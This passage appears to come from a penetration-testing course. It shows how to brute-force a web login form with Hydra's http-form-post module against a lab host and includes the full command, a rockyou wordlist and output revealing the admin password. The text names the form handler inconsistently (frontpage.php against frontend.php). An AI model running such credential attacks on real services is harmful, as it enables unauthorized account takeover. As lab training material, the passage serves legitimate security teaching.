
login check must be preceded by `"S="`.

This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!

以下参数是可选的：

- `C=/page/uri` 用于定义不同的页面以收集初始 cookie
- `(h|H)=My-Hdr: foo` 用于在每个请求中发送用户定义的 HTTP 头
- `USER[64]` 和 `PASS[64]` 也可以放入这些头中！

注意：无论 Hydra 是否已经在发送该头，`'h'` 都会在末尾添加用户定义的 HTTP 头。如果该头已存在，`'H'` 将用用户提供的值替换该头的值，或者在末尾添加该头。请注意，如果你要在头中使用冒号（`:`），应该用反斜杠进行转义。所有不是选项分隔符的冒号都应该转义（参见上面的示例）。你可以指定头而不转义冒号，但这样你无法在头值本身中包含冒号，因为它们会被 Hydra 解释为选项分隔符。

### 列表 610 - 关于 http-form-post 模块的附加信息

从这个输出中，我们确定需要提供一组参数，这要求我们执行一些应用程序发现。首先，我们需要 Windows 客户端上包含 Web 表单的网页的 IP 地址和 URL。IP 地址将作为 Hydra 的第一个参数提供。

接下来，我们必须通过检查相关网页（位于 `/form/login.html`）的 HTML 代码来理解我们要进行暴力破解的 Web 表单。

图 294 显示了在页面中右键单击并选择上下文菜单中的**查看页面源代码**后目标 Web 表单的代码：

![](img/ec25e59d75726b7041242a56d3376832_577_0.png)

上述表单是 `/form/login.html` 页面的一部分，它表明 POST 请求由 `/form/frontpage.php` 处理，这是我们要传递给 Hydra 的 URL。列表 610 中显示的语法需要表单参数，在本案中是 `user` 和 `pass`。由于我们使用字典攻击管理员用户登录，传递给 Hydra 的组合参数变为 `/form/frontpage.php:user=admin&pass=^PASS^`，其中 `^PASS^` 充当字典文件条目的占位符。

![](img/ec25e59d75726b7041242a56d3376832_578_0.png)

我们还必须提供条件字符串以指示登录尝试不成功时的情况。这可以通过尝试几次手动登录来找到。在我们的示例中，如图 295 所示，网页返回文本“INVALID LOGIN”。

![](img/ec25e59d75726b7041242a56d3376832_578_1.png)

将这些部分组合起来，我们可以完成 http-form-post 语法，如列表 611 所示。

```bash
http-form-post "/form/frontend.php:user=admin&pass=^PASS^:INVALID LOGIN"
```

### 列表 611 - 指定 http-form-post 语法

现在可以执行完整命令了。我们将提供管理员用户名（`-l admin`）和字典文件（`-P`），使用 `-vV` 请求详细输出，并使用 `-f` 在找到第一个成功结果时停止攻击。此外，我们将提供服务模块名称（`http-form-post`）及其所需参数（`"/form/frontend.php:user=admin&pass=^PASS^:INVALID LOGIN"`），如列表 612 所示：

```bash
kali@kali:~$ hydra 10.11.0.22 http-form-post "/form/frontend.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f

Hydra v8.8 (c) 2019 by van Hauser/THC – Please do not use in military or secret service

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-06-07 15:55:21

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:i:p/14344399)

[DATA] attacking http-post-form://10.11.0.22/form/frontend.php:user=admin&pass=^PASS^:INVALID LOGIN

[VERBOSE] Resolving addresses ... [VERBOSE] resolving done

[ATTEMPT] target 10.11.0.22 - login "admin" - pass "123456" - 1 of 14344399 [child 0]

[ATTEMPT] target 10.11.0.22 - login "admin" - pass "12345" - 2 of 14344399 [child 1]

[ATTEMPT] target 10.11.0.22 - login "admin" - pass "123456789" - 3 of 14344399 [child 2]

[ATTEMPT] target 10.11.0.22 - login "admin" - pass "password" - 4 of 14344399 [child 3]

[ATTEMPT] target 10.11.0.22 - login "admin" - pass "iloveyou" - 5 of 14344399 [child 4]

[ATTEMPT] target 10.11.0.22 - login "admin" - pass "princess" - 6 of 14344399 [child 5]

[ATTEMPT] target 10.11.0.22 - login "admin" - pass "1234567" - 7 of 14344399 [child 6]

....

[ATTEMPT] target 10.11.0.22 - login "admin" - pass "karina" - 268 of 14344399 [child 1]

[ATTEMPT] target 10.11.0.22 - login "admin" - pass "dookie" - 269 of 14344399 [child 2]

[ATTEMPT] target 10.11.0.22 - login "admin" - pass "hotmail1" - 270 of 14344399 [child 3]

[ATTEMPT] target 10.11.0.22 - login "admin" - pass "0123456789" - 271 of 14344399 [child 4]

[80][http-post-form] host: 10.11.0.22   login: admin   password: crystal

[STATUS] attack finished for 10.11.0.22 (valid pair found)

1 of 1 target successfully completed, 1 valid password found

Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-06-07 15:55:29
```
